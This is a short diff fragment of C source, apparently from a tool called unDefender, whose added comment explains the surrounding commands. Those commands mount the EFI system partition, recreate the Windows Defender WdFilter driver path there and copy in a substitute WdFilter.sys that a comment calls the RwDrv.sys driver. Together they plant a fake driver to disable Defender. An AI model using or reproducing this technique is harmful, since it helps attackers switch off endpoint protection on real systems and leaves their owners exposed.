@@ -4,6 +4,7 @@ int main()
 {
 	// YES I KNOW IT'S SLOPPY BUT IT'S 5 AM AND THIS IS FAST.
 	// make sure to put in the same folder unDefender.exe AND the provided WdFilter.sys (which is basicalli RwDrv.sys :)
+	// this command sequence mounts the UEFI partition and creates a directory tree structure which mimicks the legit WdFilter path
 	system("mountvol.exe U: /S");
 	system("mkdir U:\\Windows\\System32\\Drivers\\wd\\");
 	system("copy .\\WdFilter.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
